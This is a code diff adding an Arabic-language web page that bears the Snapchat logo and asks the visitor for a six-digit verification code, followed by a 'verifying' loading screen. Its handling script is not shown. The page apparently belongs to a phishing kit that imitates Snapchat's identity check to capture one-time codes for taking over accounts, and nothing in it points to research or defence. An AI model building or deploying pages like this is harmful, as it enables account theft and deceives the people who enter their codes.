@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        .otp-container { display: flex; justify-content: center; gap: 10px; direction: ltr; margin-bottom: 20px; }
+        .otp-input { width: 45px; height: 50px; text-align: center; font-size: 1.2rem; border: 1px solid #ddd; border-radius: 8px; }
+    </style>
+</head>
+<body>
+    <header><div class="container"><img src="logo.png" alt="Snapchat" class="logo"></div></header>
+
+    <main class="container">
+        <div class="form-wrapper">
+            <h2 style="text-align: center;">رمز التحقق</h2>
+            <p style="text-align: center; color: #666; margin-bottom: 25px;">أدخل الرمز المكون من 6 أرقام.</p>
+            
+            <div class="otp-container">
+                <input type="number" class="otp-input" maxlength="1">
+                <input type="number" class="otp-input" maxlength="1">
+                <input type="number" class="otp-input" maxlength="1">
+                <input type="number" class="otp-input" maxlength="1">
+                <input type="number" class="otp-input" maxlength="1">
+                <input type="number" class="otp-input" maxlength="1">
+            </div>
+
+            <button id="verifyBtn" style="width: 100%;">تأكيد</button>
+        </div>
+    </main>
+
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="loader"></div>
+        <p id="timerText" style="font-weight: bold; text-align: center;">جاري التحقق...</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
